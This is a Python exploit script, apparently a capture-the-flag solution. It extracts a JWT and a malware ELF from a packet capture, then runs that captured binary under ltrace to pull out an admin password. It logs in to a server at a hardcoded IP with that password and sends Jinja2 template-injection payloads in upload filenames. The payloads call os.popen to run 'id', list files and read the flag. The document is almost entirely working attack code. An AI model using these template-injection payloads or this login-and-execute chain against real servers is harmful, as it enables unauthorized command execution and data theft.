from urllib.request import urlopen, Request, HTTPRedirectHandler, build_opener, install_opener, HTTPError
from PythonToolsKit.PrintF import printf
from base64 import b16decode, b64decode
from scapy.all import sniff, TCP, Raw
from shutil import copyfileobj
from os import system, popen
from json import loads
from sys import stdout

class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

malware_start = False
first = True

for packet in sniff(offline="christmas.pcapng", lfilter=lambda x: x.haslayer(TCP) and x.haslayer(Raw) and (x[TCP].sport == 1337 or x[TCP].dport == 1337)):
    if packet[TCP].sport == 1337 and malware_start:
        with open("binary.elf", "ab") as file:
            file.write(packet[Raw].load)
    elif packet[TCP].sport == 1337:
        malware_start = packet[Raw].load.startswith(b"\x7fELF")
        if malware_start:
            with open("binary.elf", "wb") as file:
                file.write(packet[Raw].load)
    else:
        if first:
            jwt = packet[Raw].load.split(b"token=")[1].strip()
            for a in range(3):
                try:
                    login = loads(b64decode(jwt.split(b".")[1] + b"=" * a).decode())["username"]
                except:
                    pass
                else:
                    printf("JWT found:" + jwt.decode())
                    printf("Login found:" + login)
                    break
        first = False
        with open("file.encrypted", "wb") as file:
            file.write(b16decode(packet[Raw].load.split(b"\r\n\r\n")[1].split(b"\r\n")[0]))

system("chmod u+x binary.elf")
data = popen("ltrace ./binary.elf http://162.19.255.92:1337/upload file.encrypted 2>&1").read()
print(data)

first = True
for line in data.splitlines():
    if line.startswith('strlen("'):
        if first:
            first = False
            continue
        password = line[8:].split('"', 1)[0]
        printf("Password found: " + password)
        break

with open("file.enc", "rb") as file:
    printf("Decrypted file: " + b16decode(file.read()).decode())

opener = build_opener(NoRedirect)
install_opener(opener)

try:
    auth = urlopen(Request("http://162.19.255.92:1337/login", method="POST", data=b"username=admin&password=MySuP3rStR0nGP4sSw0rDDD%23%23%23", headers={"Content-Type": "application/x-www-form-urlencoded"}))
except HTTPError as e:
    auth = e

token = auth.getheader("Set-Cookie").split("=")[1].split(";", 1)[0]
printf("New token: " + token)

# another way to get the encrypted file is, this is not very useful because we may login in to access download
with open("file2.encrypted", "wb") as file:
    copyfileobj(urlopen(Request("http://162.19.255.92:1337/files?f=file.enc", headers={"Cookie": f"token={token}"})), file)

copyfileobj(urlopen(Request(
    "http://162.19.255.92:1337/upload",
    data=b'''-----------------------------18136961752888167217815560157
Content-Disposition: form-data; name="file"; filename="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
Content-Type: text/html

{{ 7 * 7 }}

-----------------------------18136961752888167217815560157--''',
    method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), stdout.buffer)

copyfileobj(urlopen(Request(
    "http://162.19.255.92:1337/upload",
    data=b'''-----------------------------18136961752888167217815560157
Content-Disposition: form-data; name="file"; filename="{{ ', '.join(self._TemplateReference__context.cycler.__init__.__globals__.os.listdir()) }}"
Content-Type: text/html

{{ 7 * 7 }}

-----------------------------18136961752888167217815560157--''',
    method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), stdout.buffer)

print()

copyfileobj(urlopen(Request(
    "http://162.19.255.92:1337/upload",
    data=b'''-----------------------------18136961752888167217815560157
Content-Disposition: form-data; name="file"; filename="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag_0fd1c6.txt').read() }}"
Content-Type: text/html

{{ 7 * 7 }}

-----------------------------18136961752888167217815560157--''',
    method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), stdout.buffer)

stdout.flush()